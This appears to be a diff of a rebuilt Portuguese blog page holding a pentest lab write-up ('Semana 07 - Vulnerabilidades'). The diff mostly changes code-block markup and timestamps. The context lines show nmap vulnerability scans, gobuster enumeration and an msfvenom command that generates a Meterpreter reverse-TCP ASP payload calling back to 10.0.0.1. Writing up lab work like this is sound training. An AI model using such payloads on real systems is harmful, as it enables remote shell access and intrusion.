@@ -5,8 +5,8 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:Natan]">
-<meta name="description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas.  1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
-msf6 &amp;gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
+<meta name="description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas. 1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
+msf6 &amp;gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
 Na web recebemos uma solicitação de credenciais que informou o serviço que está em execução: IPFire" />
 <meta name="keywords" content="DCPT,Pentest,CTF,Cybersecurity,RedTeam,TryhackMe,Hackthebox,certification, writeup, pentest, security, desec, DCPT, CTF" />
 <meta name="robots" content="noodp" />
@@ -44,31 +44,31 @@ Na web recebemos uma solicitação de credenciais que informou o serviço que es
 
 
 <meta itemprop="name" content="NPP - Semana 07 - Vulnerabilidades">
-<meta itemprop="description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas.  1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
-msf6 &gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
-Na web recebemos uma solicitação de credenciais que informou o serviço que está em execução: IPFire"><meta itemprop="datePublished" content="2021-08-02T00:00:00&#43;00:00" />
-<meta itemprop="dateModified" content="2021-08-02T00:00:00&#43;00:00" />
+<meta itemprop="description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas. 1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
+msf6 &gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
+Na web recebemos uma solicitação de credenciais que informou o serviço que está em execução: IPFire"><meta itemprop="datePublished" content="2021-08-02T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-08-02T00:00:00+00:00" />
 <meta itemprop="wordCount" content="537"><meta itemprop="image" content="https://nmmorette.github.io"/>
 <meta itemprop="keywords" content="writeup,pentest,security,desec,DCPT,CTF," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://nmmorette.github.io"/>
 
 <meta name="twitter:title" content="NPP - Semana 07 - Vulnerabilidades"/>
-<meta name="twitter:description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas.  1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
-msf6 &gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
+<meta name="twitter:description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas. 1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
+msf6 &gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
 Na web recebemos uma solicitação de credenciais que informou o serviço que está em execução: IPFire"/>
 
 
 
 
     <meta property="og:title" content="NPP - Semana 07 - Vulnerabilidades" />
-<meta property="og:description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas.  1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
-msf6 &gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
+<meta property="og:description" content="O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas. 1.Host I Nesse host vamos iniciar com o msfconsole. Vamos rodar o primeiro scan:
+msf6 &gt; db_nmap -sSV -Pn 172.16.1.100 Temos a porta 81 rodando um Apache, vamos tentar acessar via web e conseguir mais informações do host.
 Na web recebemos uma solicitação de credenciais que informou o serviço que está em execução: IPFire" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://nmmorette.github.io/posts/2021/08/npp-semana-07-vulnerabilidades/" /><meta property="og:image" content="https://nmmorette.github.io"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-08-02T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-08-02T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2021-08-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-08-02T00:00:00+00:00" />
 
 
 
@@ -197,8 +197,8 @@ if (!doNotTrack) {
 
 <p>Nesse host vamos iniciar com o <code>msfconsole</code>.
 Vamos rodar o primeiro scan:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">-</span>sSV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">172.16.1.100</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">-</span>sSV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">172.16.1.100</span>
+</span></span></code></pre></div>
     <img src="/images/semana07-vuln/nmap1.png"  class="center"  style="border-radius: 10px;"  />
 
 
@@ -255,15 +255,15 @@ Vamos rodar o primeiro scan:</p>
 
 
 <p>Vamos fazer um scan no segundo host:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> db_nmap <span style="color:#f92672">-</span>sSV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">172.16.1.233</span>
-</code></pre></div><p>Agora temos dois hosts em nossa seção do msf6:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> db_nmap <span style="color:#f92672">-</span>sSV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">172.16.1.233</span>
+</span></span></code></pre></div><p>Agora temos dois hosts em nossa seção do msf6:</p>
 
     <img src="/images/semana07-vuln/hosts.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>Vamos executar o <code>nmap</code> com o script de vulnerabilidades para encontrar possíveis vetores de ataque:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">--</span>script vuln <span style="color:#ae81ff">172.16.1.233</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">--</span>script vuln <span style="color:#ae81ff">172.16.1.233</span>
+</span></span></code></pre></div>
     <img src="/images/semana07-vuln/ms017.png"  class="center"  style="border-radius: 10px;"  />
 
 
@@ -303,14 +303,14 @@ Vamos rodar o primeiro scan:</p>
 
 
 <p>Scan inicial:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">-</span>sSV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">172.16.1.108</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">-</span>sSV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">172.16.1.108</span>
+</span></span></code></pre></div>
     <img src="/images/semana07-vuln/host31.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>Faremos o mesmo processo do host anterior, vamos executar o <code>nmap</code> com script de vulnerabilidade</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">--</span>script vuln <span style="color:#ae81ff">172.16.1.108</span>
-</code></pre></div><p>Agora temos três hosts em nosso console:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf6 <span style="color:#f92672">&gt;</span> db_nmap <span style="color:#f92672">--</span>script vuln <span style="color:#ae81ff">172.16.1.108</span>
+</span></span></code></pre></div><p>Agora temos três hosts em nosso console:</p>
 
     <img src="/images/semana07-vuln/host32.png"  class="center"  style="border-radius: 10px;"  />
 
@@ -348,8 +348,8 @@ Criando arquivo de teste e logando no servidor:</p>
 
 <p>Agora vamos preparar um payload para envio.
 O IIS utiliza asp, logo vamos gerar um payload nesse formado.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">$</span> msfvenom <span style="color:#f92672">-</span>p windows<span style="color:#f92672">/</span>meterpreter<span style="color:#f92672">/</span>reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span> <span style="color:#f92672">-</span>f asp <span style="color:#f92672">&gt;</span> hellothere.asp
-</code></pre></div><p>Vamos utilizar o exploit multi/handler 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> msfvenom <span style="color:#f92672">-</span>p windows<span style="color:#f92672">/</span>meterpreter<span style="color:#f92672">/</span>reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span> <span style="color:#f92672">-</span>f asp <span style="color:#f92672">&gt;</span> hellothere.asp
+</span></span></code></pre></div><p>Vamos utilizar o exploit multi/handler 
 Edite as informações de LHOST, LPORT e payload no <code>mfsconsole</code> utilizando o multi/handler:</p>
 
     <img src="/images/semana07-vuln/multi.png"  class="center"  style="border-radius: 10px;"  />
@@ -413,8 +413,8 @@ Edite as informações de LHOST, LPORT e payload no <code>mfsconsole</code> util
 
 
 <p>Vamos enumerar os arquivos com gobuster:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gobuster dir <span style="color:#f92672">--</span>no<span style="color:#f92672">-</span>error <span style="color:#f92672">-</span>u http:<span style="color:#75715e">//172.30.0.108/   -w /usr/share/wfuzz/wordlist/vulns/cgis.txt
-</span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gobuster dir <span style="color:#f92672">--</span>no<span style="color:#f92672">-</span>error <span style="color:#f92672">-</span>u http:<span style="color:#75715e">//172.30.0.108/   -w /usr/share/wfuzz/wordlist/vulns/cgis.txt
+</span></span></span></code></pre></div>
     <img src="/images/semana07-vuln/gobuster.png"  class="center"  style="border-radius: 10px;"  />
 
 
@@ -653,7 +653,7 @@ Acessando o arquivo podemos ver que ele roda um script de uptime:</p>
 
 
 
-<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+<script type="text/javascript" src="/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
 
 
 
